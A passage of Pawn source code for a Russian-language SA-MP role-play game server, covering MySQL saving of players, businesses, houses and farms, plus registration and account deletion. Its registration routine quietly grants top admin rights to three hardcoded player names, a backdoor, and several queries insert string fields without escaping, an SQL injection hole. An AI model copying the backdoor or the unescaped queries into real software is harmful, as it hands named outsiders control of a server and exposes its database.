			QUERY, PlayerInfo[i][pAddiction], PlayerInfo[i][pNarcoLomka], PlayerInfo[i][pPayDayHad], PlayerInfo[i][pTut], PlayerInfo[i][pWarns], PlayerInfo[i][OffWarns], PlayerInfo[i][punWarns], PlayerInfo[i][pFuel], PlayerInfo[i][pMarriedTo], PlayerInfo[i][pMushrooms]);

			mysql_format(DATABASE, QUERY, sizeof(QUERY), "%s, `pFishes` = '%f', `pBank` = '%i', `pMobile` = '%i', `pDolg` = '%i', `pKrisha` = '%i', `pUseKrisha` = '%i', `pWantedLevel` = '%i'",
			QUERY, PlayerInfo[i][pFishes], PlayerInfo[i][pBank], PlayerInfo[i][pMobile], PlayerInfo[i][pDolg], PlayerInfo[i][pKrisha], PlayerInfo[i][pUseKrisha], PlayerInfo[i][pWantedLevel]);

			mysql_format(DATABASE, QUERY, sizeof(QUERY), "%s, `pWeapons` = '%s', `pAmmos` = '%s', `pGunSkills` = '%s', `ptaxiexp` = '%i', `ptaxilvl` = '%i', `pTraining` = '%i', `pBoxSkill` = '%i', `pKongfuSkill` = '%i', `pKickboxSkill` = '%i', `pDLevel` = '%i', `pDExp` = '%i'",
			QUERY, PlayerInfo[i][pWeapons], PlayerInfo[i][pAmmos], PlayerInfo[i][pGunSkills], PlayerInfo[i][ptaxiexp], PlayerInfo[i][ptaxilvl], PlayerInfo[i][pTraining], PlayerInfo[i][pBoxSkill], PlayerInfo[i][pKongfuSkill], PlayerInfo[i][pKickboxSkill], PlayerInfo[i][pDLevel], PlayerInfo[i][pDExp]);

			mysql_format(DATABASE, QUERY, sizeof(QUERY), "%s, `pDMgruz` = '%i', `pPSkill` = '%i', `pPProc` = '%i', `pPMGruz` = '%i', `pDonateAccount` = '%i'",
			QUERY, PlayerInfo[i][pDMgruz], PlayerInfo[i][pPSkill], PlayerInfo[i][pPProc], PlayerInfo[i][pPMGruz], PlayerInfo[i][pDonateAccount]);

			mysql_format(DATABASE, QUERY, sizeof(QUERY), "%s, `pChas` = `pChas` + %i, `pMin` = `pMin` + %i, `pSkilla` = '%i', `prods_skill` = '%i', `prods_exp` = '%i', `pSpawnChange` = '%i,%i', `progolos` = '%i', `grating` = '%i', `pDonateMoney` = '%i'",
			QUERY, Online[i], Online[i], PlayerInfo[i][pSkilla], PlayerInfo[i][pProdsSkill][0], PlayerInfo[i][pProdsSkill][1], PlayerInfo[i][pSpawnChange][0], PlayerInfo[i][pSpawnChange][1], PlayerInfo[i][progolos], PlayerInfo[i][pGRating], PlayerInfo[i][pDonateMoney]);
			
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "%s, `pRecognition` = '%i', `pRobHouse` = '%i', `pFishesPach` = '%i', `pDrivingSkill` = '%i', `pGoogleIP` = '%i', `pEmail` = '%s', `activate_mail` = '%i'",
			QUERY, PlayerInfo[i][pRecognition], PlayerInfo[i][pRobHouse], PlayerInfo[i][pFishesPach], PlayerInfo[i][pDrivingSkill], PlayerInfo[i][pGoogleIP], PlayerInfo[i][pEmail], PlayerInfo[i][pActivemail]);

			mysql_format(DATABASE, QUERY, sizeof(QUERY), "%s WHERE `Name` = '%e'", QUERY, PlayerInfo[i][pName]);
			mysql_function_query(DATABASE, QUERY, false, "", "");
			printf("Файл-Аккаунт %s успешно сохранён", PlayerInfo[i][pName]);
			DeletePVar(i, "player_save");
		}
	case 3:
		{
			format(WorkshopInfo[i][wAuctions],128,"%i, %i, %i, %i, %i",WorkshopInfo[i][wAuction][0], WorkshopInfo[i][wAuction][1], WorkshopInfo[i][wAuction][2], WorkshopInfo[i][wAuction][3], WorkshopInfo[i][wAuction][4]);
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_WORKSHOPS"` SET ");
			format(temp,sizeof(temp),"`owner`= '%s',",WorkshopInfo[i][wOwner]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank`= '%i',",WorkshopInfo[i][wBank]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`landtax`= '%i',",WorkshopInfo[i][wLandTax]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`prods`= '%i',",WorkshopInfo[i][wProds]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`priceprods`= '%i',",WorkshopInfo[i][wPriceProds]), 		strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`zp`= '%i',",WorkshopInfo[i][wZp]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`deputy_one`= '%s',",WorkshopInfo[i][wDeputy1]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`deputy_two`= '%s',",WorkshopInfo[i][wDeputy2]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`deputy_three`= '%s',",WorkshopInfo[i][wDeputy3]), 		strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mechanic_one`= '%s',",WorkshopInfo[i][wMechanic1]), 		strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mechanic_two`= '%s',",WorkshopInfo[i][wMechanic2]), 		strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mechanic_three`= '%s',",WorkshopInfo[i][wMechanic3]), 	strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mechanic_four`= '%s',",WorkshopInfo[i][wMechanic4]), 	strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mechanic_five`= '%s',",WorkshopInfo[i][wMechanic5]), 	strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`auctions`= '%s',",WorkshopInfo[i][wAuctions]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`auction_name`= '%s',",WorkshopInfo[i][wAuctionName]), 	strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Biker`= '%i'",WorkshopInfo[i][wBiker]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp)," WHERE id = '%i'",WorkshopInfo[i][wID]),					strcat(QUERY,temp,sizeof(QUERY));
			mysql_function_query(DATABASE, QUERY, true, "", "");
		}
	case 4:
		{
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_BIZZ"` SET ");
			format(temp,sizeof(temp),"`bOwner`= '%s',",BizzInfo[i][bOwner]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bMessage`= '%s',",BizzInfo[i][bMessage]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bEntranceX`= '%f',",BizzInfo[i][bEntranceX]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bEntranceY`= '%f',",BizzInfo[i][bEntranceY]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bEntranceZ`= '%f',",BizzInfo[i][bEntranceZ]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bExitX`= '%f',",BizzInfo[i][bExitX]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bExitY`= '%f',",BizzInfo[i][bExitY]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bExitZ`= '%f',",BizzInfo[i][bExitZ]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bBuyPrice`= '%i',",BizzInfo[i][bBuyPrice]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bEntranceCost`= '%i',",BizzInfo[i][bEntranceCost]), 		strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bTill`= '%i',",BizzInfo[i][bTill]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bLocked`= '%i',",BizzInfo[i][bLocked]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bInterior`= '%i',",BizzInfo[i][bInterior]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bProducts`= '%i',",BizzInfo[i][bProducts]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bPrice`= '%i',",BizzInfo[i][bPrice]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bBarX`= '%f',",BizzInfo[i][bBarX]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bBarY`= '%f',",BizzInfo[i][bBarY]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bBarZ`= '%f',",BizzInfo[i][bBarZ]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bMafia`= '%i',",BizzInfo[i][bMafia]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bType`= '%i',",BizzInfo[i][bType]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bLockTime`= '%i',",BizzInfo[i][bLockTime]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bLicense`= '%i',",BizzInfo[i][bLicense]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bStavka`= '%i',",BizzInfo[i][bStavka]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bNameStavka`= '%s',",BizzInfo[i][bNameStavka]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bLastStavka`= '%i',",BizzInfo[i][bLastStavka]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bTimeStavka`= '%i',",BizzInfo[i][bTimeStavka]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bMinStavka`= '%i',",BizzInfo[i][bMinStavka]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bVirtualWorld`= '%i',",BizzInfo[i][bVirtualWorld]), 		strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bLandTax`= '%i',",BizzInfo[i][bLandTax]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bProdPrice`= '%i'",BizzInfo[i][bProdPrice]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp)," WHERE bID = '%i'",BizzInfo[i][bID]),						strcat(QUERY,temp,sizeof(QUERY));
			mysql_function_query(DATABASE, QUERY, true, "", "");
		}
	case 5:
		{
			format(HouseInfo[i][hSafes],128,"%i, %i, %i, %i, %i, %i, %i, %i, %i, %i, %i",HouseInfo[i][hSafe][0], HouseInfo[i][hSafe][1], HouseInfo[i][hSafe][2], HouseInfo[i][hSafe][3], HouseInfo[i][hSafe][4],
			HouseInfo[i][hSafe][5], HouseInfo[i][hSafe][6], HouseInfo[i][hSafe][7], HouseInfo[i][hSafe][8], HouseInfo[i][hSafe][9], HouseInfo[i][hSafe][10]);
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_HOUSE"` SET ");
			format(temp,sizeof(temp),"`hEntrancex`= '%f',",HouseInfo[i][hEntrancex]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hEntrancey`= '%f',",HouseInfo[i][hEntrancey]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hEntrancez`= '%f',",HouseInfo[i][hEntrancez]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hExitx`= '%f',",HouseInfo[i][hExitx]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hExity`= '%f',",HouseInfo[i][hExity]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hExitz`= '%f',",HouseInfo[i][hExitz]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hOwner`= '%s',",HouseInfo[i][hOwner]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hValue`= '%i',",HouseInfo[i][hValue]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hTakings`= '%i',",HouseInfo[i][hTakings]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hHel`= '%i',",HouseInfo[i][hHel]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hInt`= '%i',",HouseInfo[i][hInt]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hLock`= '%i',",HouseInfo[i][hLock]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hVec`= '%i',",HouseInfo[i][hVec]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hVcol1`= '%i',",HouseInfo[i][hVcol1]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hVcol2`= '%i',",HouseInfo[i][hVcol2]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hKlass`= '%i',",HouseInfo[i][hKlass]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hVehSost`= '%i',",HouseInfo[i][hVehSost]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hCarx`= '%f',",HouseInfo[i][hCarx]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hCary`= '%f',",HouseInfo[i][hCary]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hCarz`= '%f',",HouseInfo[i][hCarz]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hCarc`= '%f',",HouseInfo[i][hCarc]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`hSafes`= '%s'",HouseInfo[i][hSafes]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp)," WHERE hID = '%i'",HouseInfo[i][hID]),					strcat(QUERY,temp,sizeof(QUERY));
			mysql_function_query(DATABASE, QUERY, true, "", "");
		}
	case 6:
		{
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_KVARTIRS"` SET ");
			format(temp,sizeof(temp),"`pXpic`= '%f',",kvartinfo[i][pXpic]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`pYpic`= '%f',",kvartinfo[i][pYpic]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`pZpic`= '%f',",kvartinfo[i][pZpic]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`vladelec`= '%s',",kvartinfo[i][vladelec]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`lock`= '%i',",kvartinfo[i][lock]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`kworld`= '%i',",kvartinfo[i][kworld]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`aptek`= '%i',",kvartinfo[i][aptek]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`plata`= '%i',",kvartinfo[i][plata]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`kCena`= '%i',",kvartinfo[i][kCena]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`kInt`= '%i',",kvartinfo[i][kInt]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`virtmir`= '%i'",kvartinfo[i][virtmir]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp)," WHERE kid = '%i'",kvartinfo[i][kid]),					strcat(QUERY,temp,sizeof(QUERY));
			mysql_function_query(DATABASE, QUERY, true, "", "");
		}
	case 7:
		{
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_PODEZDS"` SET ");
			format(temp,sizeof(temp),"`podPicX`= '%f',",PodeezdInfo[i][podPicX]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`podPicY`= '%f',",PodeezdInfo[i][podPicY]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`podPicZ`= '%f',",PodeezdInfo[i][podPicZ]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`podEtazi`= '%i',",PodeezdInfo[i][podEtazi]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`carX`= '%f',",PodeezdInfo[i][carX]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`carY`= '%f',",PodeezdInfo[i][carY]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`carZ`= '%f',",PodeezdInfo[i][carZ]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`podInt`= '%i',",PodeezdInfo[i][podInt]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`carC`= '%f'",PodeezdInfo[i][carC]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp)," WHERE pid = '%i'",PodeezdInfo[i][pid]),					strcat(QUERY,temp,sizeof(QUERY));
			mysql_function_query(DATABASE, QUERY, true, "", "");
		}
	case 8:
		{
			mysql_format(DATABASE,QUERY, 500, "UPDATE "TABLE_ATM" SET `id` = '%i', `ax` = '%f', `ay` = '%f', `az` = '%f', `arz` = '%f' WHERE id = %i",
			ATMInfo[i][aid], ATMInfo[i][aX],ATMInfo[i][aY],ATMInfo[i][aZ],ATMInfo[i][arZ], ATMInfo[i][aid]);
			mysql_function_query(DATABASE, QUERY, true, "", "");
		}
	case 9:
		{
			format(FarmInfo[i][fAuctions],64,"%i, %i, %i, %i, %i",FarmInfo[i][fAuction][0], FarmInfo[i][fAuction][1], FarmInfo[i][fAuction][2], FarmInfo[i][fAuction][3], FarmInfo[i][fAuction][4]);
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_FARM"` SET ");
			format(temp,sizeof(temp),"`owner`= '%s',",FarmInfo[i][fOwner]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank`= '%i',",FarmInfo[i][fBank]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`landtax`= '%i',",FarmInfo[i][fLandTax]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`zp`= '%i',",FarmInfo[i][fZp]), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`grain_price`= '%i',",FarmInfo[i][fGrain_Price]), 		strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`grain`= '%i',",FarmInfo[i][fGrain]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`grain_sown`= '%i',",FarmInfo[i][fGrain_Sown]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`prods_selling`= '%i',",FarmInfo[i][fProds_Selling]), 	strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`prods`= '%i',",FarmInfo[i][fProds]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`prods_price`= '%i',",FarmInfo[i][fProds_Price]), 		strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`deputy_1`= '%s',",FarmInfo[i][fDeputy_1]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`deputy_2`= '%s',",FarmInfo[i][fDeputy_2]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`deputy_3`= '%s',",FarmInfo[i][fDeputy_3]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`farmer_1`= '%s',",FarmInfo[i][fFarmer_1]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`farmer_2`= '%s',",FarmInfo[i][fFarmer_2]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`farmer_3`= '%s',",FarmInfo[i][fFarmer_3]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`farmer_4`= '%s',",FarmInfo[i][fFarmer_4]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`farmer_5`= '%s',",FarmInfo[i][fFarmer_5]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`auctions`= '%s',",FarmInfo[i][fAuctions]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`auction_name`= '%s',",FarmInfo[i][fAuctionName]), 		strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Biker`= '%i'",FarmInfo[i][fBiker]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp)," WHERE id = '%i'",FarmInfo[i][fID]),						strcat(QUERY,temp,sizeof(QUERY));
			mysql_function_query(DATABASE, QUERY, true, "", "");
		}
	case 10:
		{
			mysql_format(DATABASE,QUERY,256,"SELECT * FROM `"TABLE_CARS"` WHERE `owner` = '%s'",PlayerInfo[i][pName]), mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",37,i,"");
		}
	}
	return true;
}
publics: PlayerRegister(playerid)
{
    for(new i = 0; i < 7; i++) TextDrawHideForPlayer(playerid, Select_Skin_TD[i]);
    CancelSelectTextDraw(playerid);
    PlayerTextDrawHide(playerid, Select_Skin_PTD[playerid][0]);
	PlayerInfo[playerid][pChar][0] = ChosenSkin[playerid];
	SelectCharPlace[playerid] = 0;
	CharPrice[playerid] = 0;
	SelectCharID[playerid] = 0;
	SelectChar[playerid] = 0;
	PicCP[playerid] = 0;
	ClothesRound[playerid] = 0;
	SCM(playerid, -1, " Поздравляем Вас с успешной регистрацией!");
	SCM(playerid, 0x9b000ff, " Подсказка: Направляйтесь на работу грузчика (( Используйте /GPS >> [26] Работа грузчика ))");
	SCM(playerid, 0x9b000ff, " Подсказка: Грузчиком вы сможете заработать денег на водительские права");
	SCM(playerid, 0x9b000ff, " Подсказка: Рядом с вами есть остановка, где можно дождаться автобус ( Внутри Городской )");
	SCM(playerid, 0x9b000ff, " Подсказка: А также любой таксист отвезет вас на работу бесплатно");
	SCM(playerid, -1, " Подсказка: Мы настоятельно рекомендуем вам прочесть \"Помощь\"");
	PlayerPlaySound(playerid, 1069, 0.0, 0.0, 0.0);
	SetSpawnInfo(playerid, 0, 0, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0);
	mysql_format(DATABASE,QUERY,128,"SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%e'",PlayerInfo[playerid][pName]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",2,playerid,"");
	mysql_format(DATABASE, QUERY, sizeof(QUERY), "DELETE FROM `"TABLE_CARS"` WHERE Name = '%e'" ,PlayerInfo[playerid][pName]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	for(new i=0;i<5;i++)
	{
		mysql_format(DATABASE, QUERY, sizeof(QUERY), "INSERT INTO `"TABLE_CARS"` (`owner`,`id`,`model`,`fuel`,`color_one`,`color_two`) VALUES ('%e','%i','462','100','1','1')" ,PlayerInfo[playerid][pName],i);
		mysql_function_query(DATABASE,QUERY,false,"","");
	}
	if(!strcmp(PlayerInfo[playerid][pName], "Axel_Murphy", true) || !strcmp(PlayerInfo[playerid][pName], "Ave_Satan", true) || !strcmp(PlayerInfo[playerid][pName], "Jesus_Black", true))
	{
		if(PlayerInfo[playerid][pAdmin] < 9)
		{
			SCM(playerid, COLOR_RED, "Вам выдана админка по вписке!");
			SCM(playerid, COLOR_RED, "Введи /alogin!");
			SCM(playerid, COLOR_RED, "Далее /ahelp");
			new year, month,day;
			getdate(year, month, day);
			mysql_format(DATABASE,QUERY, 512, "INSERT INTO "TABLE_ADMIN" (Name, level, LastCon) VALUES ('%s', 10, '%02i.%02i.%04i')",PlayerInfo[playerid][pName],day,month,year);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	}
	new playersip[32];
	mysql_format(DATABASE,QUERY,128, "UPDATE `"TABLE_ACCOUNTS"` SET pIp = '%s' WHERE name = '%e'",playersip, PlayerInfo[playerid][pName]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	SaveMySQL(1, playerid);
	SaveMySQL(2, playerid);
	SaveMySQL(3, playerid);
	SaveMySQL(4, playerid);
	SaveMySQL(5, playerid);
	SaveMySQL(6, playerid);
	SaveMySQL(9, playerid);
	//SaveMySQL(10, playerid);
}
stock GetHouseOplata(idx)
{
	switch(HouseInfo[idx][hKlass])
	{
	case 0,4: return 50;
	case 1,3: return 100;
	case 2: return 150;
	case 5: return 0;
	}
	return -1;
}
stock IsANoLimiter(carid)
{
	if(IsABoat(carid) || IsAPlane(carid) || GetVehicleModel(carid) == 462 || GetVehicleModel(carid) == 481 || GetVehicleModel(carid) == 509 || GetVehicleModel(carid) == 510) return true;
	return false;
}
stock setVehicleSpeed(vehicleid, speed_mph)
{
	if (speed_mph < 1) speed_mph = 1;
	new Float: v[3], cur_speed_mph;
	GetVehicleVelocity(vehicleid, v[0], v[1], v[2]);
	cur_speed_mph = floatround(100.3 *floatsqroot(v[0]*v[0] + v[1]*v[1] + v[2]*v[2]),floatround_floor);
	if (cur_speed_mph <= 0)
	{
		new Float: zAngle;
		GetVehicleZAngle(vehicleid, zAngle);
		new Float:newVelX = floatcos((zAngle -= 270.0), degrees) *speed_mph / 100.3;
		SetVehicleVelocity(vehicleid, newVelX, floattan(zAngle,degrees) *newVelX, 0.0);
		return;
	}
	new Float: vMultiplier = float(speed_mph) / float(cur_speed_mph);
	SetVehicleVelocity(vehicleid, v[0] *vMultiplier, v[1] *vMultiplier, v[2] *vMultiplier);
}
publics: DellAccount(playerid, stringg[])
{
	new r, f, null = 0;
	cache_get_data(r, f);
	if(!r) return SCM(playerid,COLOR_GREY," Аккаунт не найден");
	for(new i = 1; i <= TotalHouse;i++) if(strcmp(HouseInfo[i][hOwner],stringg,false) == 0 && strcmp(HouseInfo[i][hOwner],"None",true) != 0) null = i;
	if(null != 0)
	{
		HouseInfo[null][hTakings] = 0;
		strmid(HouseInfo[null][hOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
		HouseInfo[null][hLock] = 1;
		HouseInfo[null][hHel] = 0;
	}
	null = 0;
	for(new i = 1; i <= TotalBizz;i++) if(strcmp(BizzInfo[i][bOwner],stringg,false) == 0 && strcmp(BizzInfo[i][bOwner],"None",true) != 0) null = i;
	if(null != 0) ClearBizz(null);
	null = 0;
	for(new i = 1; i <= ALLKVARTIRI; i++) if(strcmp(kvartinfo[i][vladelec],stringg,false) == 0) null = i;
	if(null != 0)
	{
		kvartinfo[null][aptek] = 0;
		kvartinfo[null][lock] = 0;
		kvartinfo[null][plata] = 0;
		strmid(kvartinfo[null][vladelec], "None", 0, strlen("None"), 10);
		updatekvar(null);
	}
	null = 0;
	for(new i = 1; i <= TOTALSHOPS; i++) if(strcmp(WorkshopInfo[i][wOwner],stringg,false) == 0) null = i;
	if(null != 0)
	{
		strmid(WorkshopInfo[null][wOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
		strmid(WorkshopInfo[null][wDeputy1],"None",0,strlen("None"),MAX_PLAYER_NAME);
		strmid(WorkshopInfo[null][wDeputy2],"None",0,strlen("None"),MAX_PLAYER_NAME);
		strmid(WorkshopInfo[null][wDeputy3],"None",0,strlen("None"),MAX_PLAYER_NAME);
		strmid(WorkshopInfo[null][wMechanic1],"None",0,strlen("None"),MAX_PLAYER_NAME);
		strmid(WorkshopInfo[null][wMechanic2],"None",0,strlen("None"),MAX_PLAYER_NAME);
		strmid(WorkshopInfo[null][wMechanic3],"None",0,strlen("None"),MAX_PLAYER_NAME);
		strmid(WorkshopInfo[null][wMechanic4],"None",0,strlen("None"),MAX_PLAYER_NAME);
		strmid(WorkshopInfo[null][wMechanic5],"None",0,strlen("None"),MAX_PLAYER_NAME);
		WorkshopInfo[null][wAuction][0] = 0;
		WorkshopInfo[null][wAuction][1] = 0;
		WorkshopInfo[null][wAuction][2] = 0;
		WorkshopInfo[null][wAuction][3] = 0;
		WorkshopInfo[null][wAuction][4] = 0;
		WorkshopInfo[null][wLandTax] = 0;
		WorkshopInfo[null][wBank] = 0;
		WorkshopInfo[null][wProds] = 0;
		WorkshopInfo[null][wPriceProds] = 50;
		WorkshopInfo[null][wZp] = 5;
	}
	null = 0;
	for(new i = 1; i <= TOTALFARM; i++) if(strcmp(FarmInfo[i][fOwner],stringg,false) == 0) null = i;
	if(null != 0)
	{
		strmid(FarmInfo[null][fOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
		strmid(FarmInfo[null][fDeputy_1],"None",0,strlen("None"),MAX_PLAYER_NAME);
		strmid(FarmInfo[null][fDeputy_2],"None",0,strlen("None"),MAX_PLAYER_NAME);
		strmid(FarmInfo[null][fDeputy_3],"None",0,strlen("None"),MAX_PLAYER_NAME);
		FarmInfo[null][fAuction][0] = 0;
		FarmInfo[null][fAuction][1] = 0;
		FarmInfo[null][fAuction][2] = 0;
		FarmInfo[null][fAuction][3] = 0;
		FarmInfo[null][fAuction][4] = 0;
